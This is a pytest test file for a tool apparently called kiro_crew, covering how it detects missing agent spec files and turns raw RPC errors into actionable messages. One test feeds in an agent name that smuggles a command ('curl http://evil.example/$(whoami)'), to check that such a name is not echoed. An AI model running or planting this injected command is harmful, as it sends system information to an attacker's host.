"""Missing-agent-spec diagnosability.

Two invariants for an install whose agent spec never landed on disk: the boot
install failure is surfaced at ERROR with a remedy and verified against the
filesystem, and the resulting turn failure names the missing file and the repair
command instead of dumping a raw
``{'code': -32603, ..., 'data': "Mode 'kirocrew' not found"}`` frame.
"""

from __future__ import annotations

import contextlib
import json
import logging
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from kiro_crew.acp.runtime import _format_runtime_rpc_error
from kiro_crew.agent import missing_required_agent_specs
from kiro_crew.agent_files import (
    AGENT_FILENAME,
    KNOWLEDGE_AGENT_FILENAME,
    LITE_AGENT_FILENAME,
    OWNED_KIRO_AGENT_FILES,
    REQUIRED_KIRO_AGENT_FILES,
)
from kiro_crew.config.loader import KiroCrewConfig
from kiro_crew.slack.gateway import GatewayOrchestrator


def _make_orchestrator() -> GatewayOrchestrator:
    """A dashboard-only orchestrator with mocked credentials.

    Local rather than imported from test_slack_gateway: ``test/`` is not a
    package, so a cross-module test import is not a supported path here.
    """
    cfg = KiroCrewConfig()
    with patch.object(cfg, "load_credentials", return_value={"KIROCREW_OWNER_ID": "U_OWNER"}):
        return GatewayOrchestrator(cfg, no_dashboard=True, no_crons=True, no_open=True)


def _write_spec(agents_dir: Path, filename: str) -> None:
    agents_dir.mkdir(parents=True, exist_ok=True)
    (agents_dir / filename).write_text(json.dumps({"name": filename[:-5]}), encoding="utf-8")


class TestRequiredAgentFiles:
    """The required set is the turn-blocking subset of the owned set."""

    def test_required_is_subset_of_owned(self):
        assert set(REQUIRED_KIRO_AGENT_FILES) <= set(OWNED_KIRO_AGENT_FILES)

    def test_required_holds_chat_and_background_specs(self):
        # Both are reached on paths with no fallback: AGENT_FILENAME backs user
        # chat, LITE backs SessionManager.get_bg_session (titles/compaction).
        assert set(REQUIRED_KIRO_AGENT_FILES) == {AGENT_FILENAME, LITE_AGENT_FILENAME}

    def test_feature_scoped_specs_are_not_required(self):
        # Their installers degrade to logger.debug because each only disables its
        # own feature — promoting one here would print a boot error for a
        # working install.
        assert KNOWLEDGE_AGENT_FILENAME not in REQUIRED_KIRO_AGENT_FILES


class TestMissingRequiredAgentSpecs:
    """Filesystem verification of what an install actually left behind."""

    def test_empty_dir_reports_every_required_spec(self, tmp_path):
        # The customer's state: rebuild_agent_config mkdirs the agents dir as its
        # first act, so a failure after that leaves a created-but-empty dir.
        agents_dir = tmp_path / "agents"
        agents_dir.mkdir()
        with patch("kiro_crew.agent.KIRO_AGENTS_DIR", agents_dir):
            assert missing_required_agent_specs() == list(REQUIRED_KIRO_AGENT_FILES)

    def test_absent_dir_reports_every_required_spec(self, tmp_path):
        # The decline path returns before mkdir, so the dir may not exist at all.
        with patch("kiro_crew.agent.KIRO_AGENTS_DIR", tmp_path / "nope"):
            assert missing_required_agent_specs() == list(REQUIRED_KIRO_AGENT_FILES)

    def test_complete_install_reports_nothing(self, tmp_path):
        agents_dir = tmp_path / "agents"
        for name in REQUIRED_KIRO_AGENT_FILES:
            _write_spec(agents_dir, name)
        with patch("kiro_crew.agent.KIRO_AGENTS_DIR", agents_dir):
            assert missing_required_agent_specs() == []

    def test_partial_install_reports_only_the_absent_one(self, tmp_path):
        # rebuild_agent_config writes the main spec BEFORE the lite one, so a
        # throw between them is a real reachable state — and it still breaks
        # auto-titles and every other background turn.
        agents_dir = tmp_path / "agents"
        _write_spec(agents_dir, AGENT_FILENAME)
        with patch("kiro_crew.agent.KIRO_AGENTS_DIR", agents_dir):
            assert missing_required_agent_specs() == [LITE_AGENT_FILENAME]

    def test_directory_named_like_a_spec_is_not_a_spec(self, tmp_path):
        # is_file(), not exists(): a directory at the spec path is not loadable.
        agents_dir = tmp_path / "agents"
        (agents_dir / AGENT_FILENAME).mkdir(parents=True)
        _write_spec(agents_dir, LITE_AGENT_FILENAME)
        with patch("kiro_crew.agent.KIRO_AGENTS_DIR", agents_dir):
            assert missing_required_agent_specs() == [AGENT_FILENAME]


class TestFormatRuntimeRpcError:
    """The awaited-request (handshake) error text users actually read."""

    @pytest.mark.parametrize("agent", ["kirocrew", "kirocrew-lite"])
    def test_missing_spec_error_is_actionable(self, agent, tmp_path):
        err = {
            "code": -32603,
            "message": "Internal error",
            "data": f"Mode '{agent}' not found",
        }
        with patch("kiro_crew.acp.runtime.kiro_agents_dir", return_value=tmp_path):
            text = _format_runtime_rpc_error(err)

        assert f"'{agent}.json'" in text  # names the file that is missing
        assert str(tmp_path) in text  # names where it was looked for
        assert "kirocrew setup --agent-only --clean" in text  # names the repair
        assert "-32603" not in text and "Mode" not in text  # no raw protocol noise

    def test_unknown_shape_keeps_the_raw_dict(self):
        # Never swallow an unrecognized error: the raw dict is the only record of
        # a shape nobody has classified yet.
        err = {"code": -32603, "message": "Internal error", "data": "ThrottlingException"}
        text = _format_runtime_rpc_error(err)
        assert text.startswith("RPC error: ")
        assert "ThrottlingException" in text

    def test_non_dict_error_keeps_the_raw_text(self):
        assert _format_runtime_rpc_error("boom") == "RPC error: boom"

    def test_similar_message_without_the_mode_shape_is_not_rewritten(self):
        err = {"code": -32603, "message": "Internal error", "data": "model not found"}
        assert _format_runtime_rpc_error(err).startswith("RPC error: ")

    def test_hostile_agent_name_is_not_echoed(self):
        # The name lands in user-facing text, so the charset is bounded rather
        # than greedily matched — an out-of-charset name falls through to the raw
        # (already-quoted) dict instead of being interpolated.
        err = {
            "code": -32603,
            "message": "Internal error",
            "data": "Mode 'x'; curl http://evil.example/$(whoami)' not found",
        }
        text = _format_runtime_rpc_error(err)
        assert text.startswith("RPC error: ")
        assert "setup --agent-only" not in text

    def test_overlong_agent_name_is_not_echoed(self):
        err = {"code": -32603, "message": "Internal error", "data": f"Mode '{'a' * 200}' not found"}
        assert _format_runtime_rpc_error(err).startswith("RPC error: ")


class TestGatewayInstallVerification:
    """Boot-time visibility when the install leaves no usable spec."""

    @staticmethod
    def _run_init_services(orch, *, rebuild):
        """Drive _init_services with every heavy collaborator stubbed out."""
        names = [
            "kiro_crew.slack.gateway.SkillsLoader",
            "kiro_crew.slack.gateway.HookManager",
            "kiro_crew.slack.gateway.LessonStore",
            "kiro_crew.slack.gateway.ContextBuilder",
            "kiro_crew.slack.gateway.SessionManager",
            "kiro_crew.slack.gateway.HistoryConsolidator",
            "kiro_crew.slack.gateway.ChannelHistory",
        ]
        with contextlib.ExitStack() as stack:
            for name in names:
                stack.enter_context(patch(name))
            for name in ("MemoryStore", "ConversationLog"):
                mock = stack.enter_context(patch(f"kiro_crew.slack.gateway.{name}"))
                mock.return_value = MagicMock()
            vector = stack.enter_context(patch("kiro_crew.vector_memory.VectorMemoryStore"))
            vector.return_value = MagicMock()
            stack.enter_context(patch("kiro_crew.agent.rebuild_agent_config", rebuild))
            stack.enter_context(
                patch("subprocess.run", return_value=MagicMock(returncode=0, stdout="kiro-cli 2.16.0"))
            )
            orch._init_services()

    def test_install_exception_logs_error_not_warning(self, tmp_path, caplog, capsys):
        orch = _make_orchestrator()
        boom = MagicMock(side_effect=RuntimeError("no shipped defaults"))
        with caplog.at_level(logging.ERROR, logger="kiro_crew.slack.gateway"):
            with patch("kiro_crew.agent.KIRO_AGENTS_DIR", tmp_path):
                self._run_init_services(orch, rebuild=boom)

        # ERROR, not WARNING: a turn-fatal condition must sit at the threshold
        # operators and support scripts actually read.
        assert any(
            r.levelno == logging.ERROR and "Agent config install failed" in r.message
            for r in caplog.records
        )
        assert "kirocrew setup --agent-only --clean" in capsys.readouterr().out

    def test_silent_no_write_is_reported(self, tmp_path, caplog, capsys):
        # rebuild_agent_config RETURNED a path and raised nothing, but wrote no
        # spec — the decline path, and the one an exception check cannot catch.
        orch = _make_orchestrator()
        agents_dir = tmp_path / "agents"
        agents_dir.mkdir()
        quiet = MagicMock(return_value=agents_dir / AGENT_FILENAME)
        with caplog.at_level(logging.ERROR, logger="kiro_crew.slack.gateway"):
            with patch("kiro_crew.agent.KIRO_AGENTS_DIR", agents_dir):
                with patch("kiro_crew.slack.gateway.kiro_agents_dir", return_value=agents_dir):
                    self._run_init_services(orch, rebuild=quiet)

        assert any(
            r.levelno == logging.ERROR and "Agent specs missing after install" in r.message
            for r in caplog.records
        )
        assert "kirocrew setup --agent-only --clean" in capsys.readouterr().out

    def test_healthy_install_is_silent(self, tmp_path, caplog, capsys):
        orch = _make_orchestrator()
        agents_dir = tmp_path / "agents"
        for name in REQUIRED_KIRO_AGENT_FILES:
            _write_spec(agents_dir, name)
        ok = MagicMock(return_value=agents_dir / AGENT_FILENAME)
        with caplog.at_level(logging.ERROR, logger="kiro_crew.slack.gateway"):
            with patch("kiro_crew.agent.KIRO_AGENTS_DIR", agents_dir):
                self._run_init_services(orch, rebuild=ok)

        assert not [r for r in caplog.records if r.levelno >= logging.ERROR]
        assert "ERROR" not in capsys.readouterr().out
